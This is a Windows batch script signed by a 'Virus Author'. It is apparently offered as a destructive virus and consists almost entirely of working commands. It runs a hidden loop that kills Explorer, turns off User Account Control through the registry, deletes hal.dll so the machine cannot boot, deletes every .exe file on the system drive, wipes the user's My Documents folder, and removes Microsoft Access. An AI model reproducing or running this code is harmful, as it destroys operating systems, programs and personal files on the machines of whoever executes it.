@ echo off
rem ---------------------------------
rem Kill Explorer
echo :a >>explorer.bat
echo tskill explorer >>explorer.bat
echo goto a >>explorer.bat
echo Set objShell = CreateObject("WScript.Shell")>>invisi.vbs
echo strCommand = "explorer.bat">>invisi.vbs
echo objShell.Run strCommand, vbHide, TRUE>>invisi.vbs
start "" invisi.vbs
rem ---------------------------------
rem ---------------------------------
rem Hide CMD Window
if exist winstart.vbs goto next
echo set objShell = CreateObject("WScript.Shell") >> winstart.vbs
echo objShell.Run ".bat", vbHide, TRUE >> winstart.vbs
start "" "winstart.vbs"
exit
:next
rem ---------------------------------
rem ---------------------------------
rem Disable Admin Accounts
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
rem ---------------------------------
rem ---------------------------------
rem Disable Computer By Deleting hal.dll
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
rem ---------------------------------
rem ---------------------------------
rem Delete All Exe
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
rem ---------------------------------
rem ---------------------------------
rem Delete My Documents
del /f /q '%userprofile%\My Documents\*.*'
rem ---------------------------------
rem ---------------------------------
rem Delete Access
tskill msaccess
del /f /q "%SystemDrive%\Program Files\Microsoft Office\Office10\MSACCESS.EXE"
rem ---------------------------------


__-Virus Author: -__